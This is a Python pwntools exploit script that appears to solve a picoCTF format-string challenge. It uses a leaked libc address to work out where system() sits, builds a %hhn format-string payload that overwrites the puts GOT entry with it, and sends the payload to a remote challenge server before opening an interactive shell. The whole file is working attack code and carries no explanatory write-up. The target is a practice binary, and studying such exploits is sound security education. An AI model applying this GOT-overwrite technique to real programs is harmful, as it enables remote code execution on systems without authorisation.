import sys
from pwn import *
from pwnlib.elf.elf import *
from pwnlib.fmtstr import *


def split_hex_string(hex_string):
    if len(hex_string) % 2 != 0:
        hex_string = '0' + hex_string
    split_hex = ["0x" + hex_string[i:i+2] for i in range(2, len(hex_string), 2)]
    return split_hex

def gen_payload(data, offset=10):
    splitted_data = split_hex_string(str(hex(data)))
    splitted_data = [int(s, base=16) for s in splitted_data]
    payload = ""
    cur_len = 0

    for i, b in enumerate(splitted_data[::-1]):
        db = b
        if db < cur_len:
            while db < cur_len:
                db += 256
        payload += f"%{db - cur_len}c%{offset + i}$hhn"
        cur_len += db - cur_len
    padding = "A" * (8 - len(payload) % 8)


    return payload + padding, splitted_data

context.arch='amd64'

fs3 = ELF('./format-string-3')
got_puts = fs3.got['puts']
libc = ELF('./libc.so.6')
system_offset = libc.symbols['system']
setvbuf_offset = libc.symbols['setvbuf']

log.info(f'got_puts: {hex(got_puts)}')
log.info(f'system_offset: {hex(system_offset)}')
log.info(f'setvbuf_offset: {hex(setvbuf_offset)}')

# r = process("./format-string-3")
r = remote("rhea.picoctf.net", port=62421)

r.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
res = r.recvline()
setvbuf_addr = int(res[:-1].decode(), base=16)
system_addr = (setvbuf_addr - setvbuf_offset) + system_offset

log.info(f'setvbuf_addr: {hex(setvbuf_addr)}')
log.info(f'system_addr: {hex(system_addr)}')

buf_offset = 38
dummy_len = len(gen_payload(system_addr, offset=10)[0])
payload, splitted_data = gen_payload(system_addr, offset=buf_offset + int(dummy_len / 8))
payload = payload.encode()
for i in range(len(splitted_data)):
    payload += p64(got_puts + i)
log.info(f"payload:{payload}")

r.sendline(payload)
r.interactive()
